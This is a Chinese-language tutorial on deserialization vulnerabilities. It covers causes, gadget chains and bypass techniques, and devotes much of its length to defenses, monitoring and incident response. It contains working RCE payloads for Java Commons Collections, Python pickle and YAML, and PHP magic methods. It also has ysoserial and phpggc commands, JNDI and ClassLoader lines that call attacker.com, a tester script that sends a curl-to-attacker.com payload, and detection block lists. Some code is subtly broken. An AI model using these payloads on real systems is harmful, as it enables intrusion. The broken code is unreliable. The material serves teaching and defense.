# 反序列化漏洞

## 1. 反序列化漏洞原理

### 1.1 基本概念

反序列化漏洞是指应用程序在反序列化不可信数据时，攻击者通过构造恶意序列化数据，在反序列化过程中执行任意代码或进行未授权操作的漏洞。

### 1.2 产生原因

- **反序列化不可信数据**

- **使用不安全的序列化格式**

- **存在危险的魔术方法/回调函数**

- **类路径中存在可利用的gadget链**

### 1.3 攻击流程

`攻击者构造恶意序列化数据 → 应用程序反序列化数据 → 触发危险方法调用 → 执行恶意代码`

## 2. 反序列化漏洞分类

### 2.1 按编程语言分类

#### 2.1.1 Java反序列化

```java
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // 危险操作
```

#### 2.1.2 PHP反序列化

```php
$data = unserialize($_POST['data']); // 危险操作
```

#### 2.1.3 Python反序列化

```python
import pickle
data = pickle.loads(user_input) # 危险操作
```

#### 2.1.4 .NET反序列化

```csharp
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream); // 危险操作
```

### 2.2 按攻击方式分类

#### 2.2.1 远程代码执行（RCE）

通过反序列化执行系统命令。

#### 2.2.2 文件操作

读取、写入或删除文件。

#### 2.2.3 内存破坏

导致拒绝服务或任意代码执行。

#### 2.2.4 权限提升

绕过身份验证或提升权限。

## 3. 常见攻击载荷和Gadget链

### 3.1 Java反序列化

#### 3.1.1 Commons Collections Gadget

```java
// 利用Transformer链执行命令
Transformer[] transformers = new Transformer[] {
 new ConstantTransformer(Runtime.class),
 new InvokerTransformer("getMethod", 
new Class[] {String.class, Class[].class}, 
new Object[] {"getRuntime", new Class[0]}),
 new InvokerTransformer("invoke", 
new Class[] {Object.class, Object[].class}, 
new Object[] {null, new Object[0]}),
 new InvokerTransformer("exec", 
new Class[] {String.class}, 
new Object[] {"calc.exe"})
};
```

#### 3.1.2 JNDI注入

```java
// 利用JNDI引用指向恶意类
InitialContext ctx = new InitialContext();
ctx.lookup("ldap://attacker.com/Exploit");
```

#### 3.1.3 常用Gadget链

- **CommonsCollections** - 最经典的链

- **JdbcRowSetImpl** - JNDI注入

- **TemplatesImpl** - 动态字节码加载

- **XStream** - XStream反序列化

- **FastJSON** - FastJSON自动类型转换

### 3.2 PHP反序列化

#### 3.2.1 魔术方法利用

```php
<?php
class Exploit {
    public $command = 'id';

    public function __destruct() {
        system($this->command);
    }

    public function __wakeup() {
        system($this->command);
    }
}

$payload = serialize(new Exploit());
// 输出: O:7:"Exploit":1:{s:7:"command";s:2:"id";}
?>
```

#### 3.2.2 PHPGGC (PHP Generic Gadget Chains)

```bash
# 使用工具生成payload
phpggc -s Monolog/RCE1 system 'id'
```

#### 3.2.3 常用PHP Gadget

- **Monolog** - 日志库

- **Guzzle** - HTTP客户端

- **Laravel** - 框架特定链

- **WordPress** - 插件链

### 3.3 Python反序列化

#### 3.3.1 Pickle利用

```python
import pickle
import os

class Exploit:
 def __reduce__(self):
 return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
pickle.loads(payload) # 执行命令
```

#### 3.3.2 YAML反序列化

```python
import yaml

# 危险配置
payload = "!!python/object/apply:os.system ['whoami']"
yaml.load(payload, Loader=yaml.Loader)  # 执行命令
```

### 3.4 .NET反序列化

#### 3.4.1 ObjectStateFormatter

```csharp
// 利用LosFormatter/ObjectStateFormatter
LosFormatter formatter = new LosFormatter();
formatter.Deserialize(input); // 可能执行命令
```

#### 3.4.2 [Json.NET](https://json.net/) TypeNameHandling

```csharp
// 危险配置
var settings = new JsonSerializerSettings
{
 TypeNameHandling = TypeNameHandling.All
};
JsonConvert.DeserializeObject(json, settings);
```

## 4. 绕过技术

### 4.1 编码绕过

#### 4.1.1 Base64编码

```java
// 对序列化数据进行Base64编码
String encoded = Base64.getEncoder().encodeToString(serializedData);
```

#### 4.1.2 十六进制编码

```java
// 十六进制编码绕过简单检测
String hex = Hex.encodeHexString(serializedData);
```

#### 4.1.3 URL编码

```java
// URL编码传输
String urlEncoded = URLEncoder.encode(serializedData, "UTF-8");
```

### 4.2 数据结构绕过

#### 4.2.1 数组包装

```php
// 将对象包装在数组中
$payload = serialize([new Exploit()]);
```

#### 4.2.2 字符串拼接

```java
// 分割payload再拼接
String part1 = payload.substring(0, 100);
String part2 = payload.substring(100);
```

#### 4.2.3 注释和空白符

```java
// 添加无关字符绕过模式匹配
String obfuscated = "/*comment*/" + payload + "//comment";
```

### 4.3 协议级绕过

#### 4.3.1 HTTP参数污染

```textile
data=payload1&data=payload2
```

#### 4.3.2 多部分表单

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="data"

[序列化数据]
```

#### 4.3.3 JSON内部序列化

```json
{
 "data": "rO0ABXQ...（Base64序列化数据）"
}
```

### 4.4 运行时绕过

#### 4.4.1 利用ClassLoader

```java
// 自定义ClassLoader加载恶意类
ClassLoader cl = new URLClassLoader(new URL[]{new URL("http://attacker.com/")});
Class<?> clazz = cl.loadClass("Exploit");
```

#### 4.4.2 动态代理

```java
// 使用动态代理触发方法调用
InvocationHandler handler = new MaliciousInvocationHandler();
Proxy.newProxyInstance(loader, interfaces, handler);
```

## 5. 防御措施

### 5.1 输入验证和过滤

#### 5.1.1 白名单验证

```java
public class SecureDeserializer {
 private static final Set<String> ALLOWED_CLASSES = Set.of(
 "com.example.SafeClass1",
 "com.example.SafeClass2"
 );

public static Object safeDeserialize(byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)) {
        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {

            String className = desc.getName();
            if (!ALLOWED_CLASSES.contains(className)) {
                throw new SecurityException("Class not allowed: " + className);
            }
            return super.resolveClass(desc);
        }
    };
    return ois.readObject();
}
}
```

#### 5.1.2 模式匹配过滤

```java
public class SerializationFilter {
 private static final Pattern DANGEROUS_PATTERNS = Pattern.compile(
 "java\\.lang\\.Runtime|java\\.lang\\.ProcessBuilder|" +
 "org\\.apache\\.commons\\.collections|com\\.sun\\.rowset"
 );

public static boolean isSafe(String serializedData) {
    return !DANGEROUS_PATTERNS.matcher(serializedData).find();
}

}
```

### 5.2 使用安全的序列化机制

#### 5.2.1 JSON替代二进制序列化

```java
// 使用Jackson代替Java原生序列化
ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(json, MyObject.class);
```

#### 5.2.2 安全的序列化格式

```java
// 使用Protocol Buffers、Avro等安全格式
MyProtobufMessage message = MyProtobufMessage.parseFrom(data);
```

### 5.3 运行时保护

#### 5.3.1 Java安全管理器

```java
public class SecureEnvironment {
 static {
 // 设置安全策略
 System.setSecurityManager(new SecurityManager());
 }

public static void configureSecurityPolicy() {
    Policy.setPolicy(new Policy() {
        @Override
        public PermissionCollection getPermissions(CodeSource codesource) {
            Permissions permissions = new Permissions();
            // 限制权限
            permissions.add(new FilePermission("/tmp/*", "read,write"));
            return permissions;
        }
    });
}

}
```

#### 5.3.2 反序列化过滤器（Java 9+）

```java
public class JEP290Filter {
 public static ObjectInputFilter createFilter() {
 return filterInfo -> {
 Class<?> clazz = filterInfo.serialClass();
 if (clazz != null) {
 String name = clazz.getName();
 if (name.startsWith("java.") || name.startsWith("javax.")) {
 return ObjectInputFilter.Status.ALLOWED;
 }
 return ObjectInputFilter.Status.REJECTED;
 }
 return ObjectInputFilter.Status.UNDECIDED;
 };
 }
}
```

### 5.4 框架级防护

#### 5.4.1 Spring Security配置

```java
@Configuration
public class SecurityConfig {

@Bean
public HttpFirewall strictFirewall() {
    StrictHttpFirewall firewall = new StrictHttpFirewall();
    firewall.setAllowedHttpMethods(Arrays.asList("GET", "POST"));
    return firewall;
}

}
```

#### 5.4.2 自定义消息转换器

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {

@Override
public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
    // 移除不安全的转换器
    converters.removeIf(converter -> 
        converter instanceof MappingJackson2HttpMessageConverter && 
        ((MappingJackson2HttpMessageConverter) converter).getObjectMapper()
            .isEnabled(SerializationFeature.FAIL_ON_EMPTY_BEANS));
}

}
```

### 5.5 安全编码实践

#### 5.5.1 安全的反序列化类

```java
public class SecureObjectInputStream extends ObjectInputStream {
 private final Set<String> allowedClasses;

public SecureObjectInputStream(InputStream input, Set<String> allowedClasses) 
    throws IOException {
    super(input);
    this.allowedClasses = allowedClasses;
}

@Override
protected Class<?> resolveClass(ObjectStreamClass desc) 
    throws IOException, ClassNotFoundException {

    String className = desc.getName();
    if (!allowedClasses.contains(className)) {
        throw new SecurityException("Deserialization of " + className + " is not allowed");
    }
    return super.resolveClass(desc);
}

}
```

#### 5.5.2 PHP安全配置

```php
class SecureUnserializer {
 private $allowed_classes = ['SafeClass1', 'SafeClass2'];

public function safe_unserialize($data) {
    // 检查数据是否包含危险类
    if (preg_match('/O:\d+:"(.*?)"/', $data, $matches)) {
        $class_name = $matches[1];
        if (!in_array($class_name, $this->allowed_classes)) {
            throw new SecurityException("Dangerous class: $class_name");
        }
    }
    return unserialize($data);
}

}
```

## 6. 检测和测试

### 6.1 手动测试Payloads

#### 6.1.1 Java测试Payloads

```java
// 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

#### 6.1.2 PHP测试Payloads

```php
// 基础测试payload
$test_payload = 'O:8:"stdClass":0:{}'; $test_payload = 'a:1:{i:0;s:4:"test";}';
```

#### 6.1.3 Python测试Payloads

```python
# Pickle测试
import pickle
import base64

class Test:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

payload = base64.b64encode(pickle.dumps(Test())).decode()
```

### 6.2 自动化测试工具

#### 6.2.1 专用工具

- **ysoserial** - Java反序列化利用工具

- **phpggc** - PHP反序列化利用工具

- **GadgetProbe** - 探测可用gadget链

- **Burp Suite** - 包含反序列化扫描扩展

#### 6.2.2 自定义检测脚本

```python
import requests
import base64
import subprocess

class DeserializationTester:
 def __init__(self, target_url):
 self.target_url = target_url
 self.session = requests.Session()
def test_java_deserialization(self):
 """测试Java反序列化漏洞"""
 try:
 # 使用ysoserial生成payload
 payload = subprocess.check_output([
 'java', '-jar', 'ysoserial.jar', 
'CommonsCollections1', 'curl http://attacker.com/test'
 ])

    encoded_payload = base64.b64encode(payload).decode()

    # 发送测试请求
    response = self.session.post(
        self.target_url,
        data=encoded_payload,
        headers={'Content-Type': 'application/java-serialized-object'}
    )

    # 检查响应
    if response.status_code != 200:
        print("Potential deserialization vulnerability detected")
        return True

except Exception as e:
    print(f"Test failed: {e}")

return False


def test_php_deserialization(self):
 """测试PHP反序列化漏洞"""
 payloads = [
 'O:7:"Exploit":1:{s:7:"command";s:2:"id";}',
 'a:1:{i:0;O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}}'
 ]

for payload in payloads:
    response = self.session.post(
        self.target_url,
        data={'data': payload}
    )

    if 'uid=' in response.text or 'gid=' in response.text:
        print(f"PHP deserialization vulnerability: {payload}")
        return True

return False
```

## 7. 日志和监控

### 7.1 反序列化操作监控

```java
public class DeserializationMonitor {
 private static final Logger logger = LoggerFactory.getLogger(DeserializationMonitor.class);


public static void monitorDeserialization(String source, Class<?> clazz, String dataHash) {
 // 记录反序列化操作
 logger.info("Deserialization detected - Source: {}, Class: {}, DataHash: {}", 
source, clazz.getName(), dataHash);


// 检查可疑类
if (isSuspiciousClass(clazz)) {
    alertSecurityTeam(source, clazz, dataHash);
}


}

private static boolean isSuspiciousClass(Class<?> clazz) {
 String[] dangerousPatterns = {
 "Runtime", "ProcessBuilder", "URLClassLoader", 
"TemplatesImpl", "InvokerTransformer"
 };

String className = clazz.getName().toLowerCase();
for (String pattern : dangerousPatterns) {
    if (className.contains(pattern.toLowerCase())) {
        return true;
    }
}
return false;

}

private static void alertSecurityTeam(String source, Class<?> clazz, String dataHash) {
 String alert = String.format(
 "SUSPICIOUS DESERIALIZATION DETECTED\n" +
 "Time: %s\nSource: %s\nClass: %s\nDataHash: %s",
 new Date(), source, clazz.getName(), dataHash
 );

// 发送警报
SecurityNotifier.sendAlert("Deserialization Attack", alert);

}

}
```

### 7.2 运行时字节码检测

```java
public class SecurityManagerExtension {

static {
    // 注册自定义安全管理器
    System.setSecurityManager(new SecurityManager() {
        @Override
        public void checkExec(String cmd) {
            // 检查执行命令的调用栈
            if (isCalledFromDeserialization()) {
                throw new SecurityException("Command execution from deserialization blocked");
            }
            super.checkExec(cmd);
        }

        private boolean isCalledFromDeserialization() {
            StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
            for (StackTraceElement element : stackTrace) {
                if (element.getClassName().equals("java.io.ObjectInputStream") &&
                    element.getMethodName().equals("readObject")) {
                    return true;
                }
            }
            return false;
        }
    });
}
}
```

## 8. 应急响应

### 8.1 检测到反序列化攻击

1. **立即阻断攻击源IP**

2. **检查应用程序日志和堆栈跟踪**

3. **审查被反序列化的数据**

4. **检查系统是否被植入后门**

5. **分析使用的gadget链**

### 8.2 入侵检测脚本

```bash
#!/bin/bash
# deserialization_incident_response.sh

echo "=== Deserialization Attack Incident Response ==="

# 1. 检查Java进程
echo "1. Java processes and arguments:"
ps aux | grep java | grep -v grep

# 2. 检查网络连接
echo "2. Network connections:"
netstat -tunap | grep ESTABLISHED

# 3. 检查类路径中的危险JAR
echo "3. Suspicious JAR files:"
find /var/lib/tomcat /opt -name "*.jar" | grep -E "(commons-collections|commons-beanutils)"

# 4. 检查反序列化日志
echo "4. Deserialization logs:"
grep -r "ObjectInputStream\|readObject\|unserialize" /var/log/ /opt/logs/ 2>/dev/null

# 5. 检查文件系统变化
echo "5. Recent file changes:"
find /tmp /var/tmp -type f -mtime -1
find /var/www/html -name "*.jsp" -mtime -1
```

### 8.3 修复流程

```java
// 1. 识别漏洞点
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();

// 2. 实施修复
SecureObjectInputStream sois = new SecureObjectInputStream(
 inputStream, 
Collections.unmodifiableSet(Set.of("com.example.SafeClass"))
);
Object obj = sois.readObject();

// 3. 验证修复
// 测试各种反序列化payload是否被有效阻止
```

## 9. 云环境和容器特殊考虑

### 9.1 容器安全配置

```dockerfile
# 安全的Java应用容器
FROM openjdk:11-jre-slim

# 设置安全属性
ENV JAVA_OPTS="-Djava.security.manager -Djava.security.policy==/app/security.policy"

# 使用非root用户
RUN groupadd -r appuser && useradd -r -g appuser appuser
USER appuser

# 复制安全策略文件
COPY security.policy /app/
COPY app.jar /app/

WORKDIR /app
CMD ["java", "-jar", "app.jar"]
```

安全策略文件 (security.policy):

```textile
grant {
    // 基本权限
    permission java.io.FilePermission "/tmp/*", "read,write";
    permission java.net.SocketPermission "*", "connect";

    // 限制反序列化
    permission java.lang.RuntimePermission "createClassLoader";
    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
};
```

### 9.2 服务网格安全

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
 name: deserialization-protection
spec:
 rules:

- to:
  - operation:
     methods: ["POST"]
     paths: ["/api/*"]
    when:
  - key: request.headers[content-type]
    values: ["application/java-serialized-object"]
    action: DENY
```

### 9.3 WAF规则配置

```nginx
# Nginx WAF规则阻止序列化数据
location /api/ {
    # 阻止Java序列化数据
    if ($content_type ~* "application/java-serialized-object") {
        return 403;
    }

    # 阻止包含危险模式的请求体
    set $block 0;
    if ($request_body ~* "java\.lang\.Runtime|java\.lang\.ProcessBuilder") {
        set $block 1;
    }
    if ($block = 1) {
        return 403;
    }
}
```

## 10. 持续安全实践

### 10.1 依赖安全管理

```xml
<!-- Maven依赖检查 -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>6.1.6</version>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

<!-- Maven依赖检查 -->

### 10.2 安全代码扫描

```yaml
# GitHub Actions安全扫描
name: Security Scan
on: [push, pull_request]
jobs:
  deserialization-scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Run CodeQL
      uses: github/codeql-action/analyze@v1
    - name: Dependency Check
      run: mvn org.owasp:dependency-check-maven:check
```

### 10.3 运行时保护集成

```java
// 集成RASP (Runtime Application Self-Protection)
public class RASPIntegration {

@PostConstruct
public void initRASP() {
    // 注册反序列化钩子
    RASP.registerDeserializationHook((className, data) -> {
        if (RASPRules.isDangerousClass(className)) {
            throw new SecurityException("Blocked deserialization of: " + className);
        }
    });
}

}
```